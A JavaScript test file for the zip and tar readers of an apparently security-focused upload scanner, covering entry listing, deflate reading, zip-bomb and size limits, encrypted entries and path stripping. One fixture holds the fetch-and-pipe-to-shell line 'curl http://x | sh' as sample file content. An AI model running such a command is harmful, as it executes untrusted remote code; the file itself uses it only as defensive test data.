/* Tests for the archive readers used by upload scans (zip.js and tar.js).
   Run with: node tests/archive.test.mjs   (Node 20.12 or newer) */
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const { listZip, readZipEntry } = require('../zip.js');
const { readTarGz } = require('../tar.js');

const enc = new TextEncoder(), dec = new TextDecoder();
const concat = (parts) => { const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0)); let at = 0; for (const p of parts){ out.set(p, at); at += p.length; } return out; };
const le = (n, bytes) => { const b = new Uint8Array(bytes); for (let i = 0; i < bytes; i++) b[i] = (n >>> (8 * i)) & 255; return b; };
const pipe = async (bytes, transform) => new Uint8Array(await new Response(new Blob([bytes]).stream().pipeThrough(transform)).arrayBuffer());

// Minimal zip writer. files: [{ name, text, deflate, flags, claimSize }]
async function makeZip(files){
  const locals = [], central = [];
  let offset = 0;
  for (const f of files){
    const name = enc.encode(f.name), raw = enc.encode(f.text || '');
    const data = f.deflate ? await pipe(raw, new CompressionStream('deflate-raw')) : raw;
    const size = f.claimSize === undefined ? raw.length : f.claimSize;
    const common = [le(f.flags || 0, 2), le(f.deflate ? 8 : 0, 2), le(0, 4), le(0, 4), le(data.length, 4), le(size, 4), le(name.length, 2), le(0, 2)];
    const local = concat([le(0x04034b50, 4), le(20, 2), ...common, name, data]);
    central.push(concat([le(0x02014b50, 4), le(20, 2), le(20, 2), ...common, le(0, 2), le(0, 2), le(0, 2), le(0, 4), le(offset, 4), name]));
    locals.push(local); offset += local.length;
  }
  const dir = concat(central);
  const end = concat([le(0x06054b50, 4), le(0, 4), le(files.length, 2), le(files.length, 2), le(dir.length, 4), le(offset, 4), le(0, 2)]);
  return new Blob([concat([...locals, dir, end])]);
}

// Minimal tar writer. files: [{ name, text }]
function makeTar(files){
  const blocks = [];
  for (const f of files){
    const data = enc.encode(f.text), head = new Uint8Array(512);
    head.set(enc.encode(f.name), 0);
    head.set(enc.encode(data.length.toString(8).padStart(11, '0')), 124);
    head[156] = 0x30;
    blocks.push(head, data, new Uint8Array((512 - (data.length % 512)) % 512));
  }
  blocks.push(new Uint8Array(1024));
  return concat(blocks);
}

let passed = 0;
async function test(name, fn){
  try { await fn(); passed++; console.log('ok   ' + name); }
  catch (e){ console.log('FAIL ' + name + '\n     ' + (e && e.stack ? e.stack : e)); process.exitCode = 1; }
}

await test('zip: lists entries and reads stored and deflated files', async () => {
  const text = 'curl http://x | sh\n'.repeat(200);
  const zip = await makeZip([{ name:'proj/' }, { name:'proj/a.sh', text, deflate:true }, { name:'proj\\b.txt', text:'plain' }]);
  const entries = await listZip(zip);
  assert.deepEqual(entries.map((e) => [e.path, e.type]), [['proj', 'dir'], ['proj/a.sh', 'file'], ['proj/b.txt', 'file']]);
  assert.equal(dec.decode(await readZipEntry(zip, entries[1], 1e6)), text);
  assert.equal(dec.decode(await readZipEntry(zip, entries[2], 1e6)), 'plain');
});

await test('zip: refuses an entry that unpacks beyond its declared size', async () => {
  const zip = await makeZip([{ name:'bomb.txt', text:'A'.repeat(100000), deflate:true, claimSize:10 }]);
  const [e] = await listZip(zip);
  await assert.rejects(readZipEntry(zip, e, 1e6), /declared size/);
});

await test('zip: refuses oversized and password-protected entries', async () => {
  const zip = await makeZip([{ name:'big.txt', text:'A'.repeat(5000) }, { name:'locked.txt', text:'x', flags:1 }]);
  const [big, locked] = await listZip(zip);
  await assert.rejects(readZipEntry(zip, big, 1000), /too large/);
  assert.equal(locked.encrypted, true);
  await assert.rejects(readZipEntry(zip, locked, 1000), /password/);
});

await test('zip: rejects a file that is not a zip', async () => {
  await assert.rejects(listZip(new Blob(['definitely not a zip archive'])), /not a zip/);
});

await test('tar: plain .tar with keepTop keeps stored paths', async () => {
  const tar = makeTar([{ name:'./top.sh', text:'echo hi' }, { name:'lib/a.py', text:'import os' }]);
  const seen = {};
  await readTarGz(new Blob([tar]).stream(), { gzip:false, keepTop:true, entry:() => true, file:(p, b) => { seen[p] = dec.decode(b); } });
  assert.deepEqual(seen, { 'top.sh':'echo hi', 'lib/a.py':'import os' });
});

await test('tar: .tar.gz default still strips the top-level folder', async () => {
  const gz = await pipe(makeTar([{ name:'repo-abc123/src/x.js', text:'1' }]), new CompressionStream('gzip'));
  const seen = [];
  await readTarGz(new Blob([gz]).stream(), { entry:(e) => { seen.push(e.path); return false; } });
  assert.deepEqual(seen, ['src/x.js']);
});

console.log(passed + ' passed');
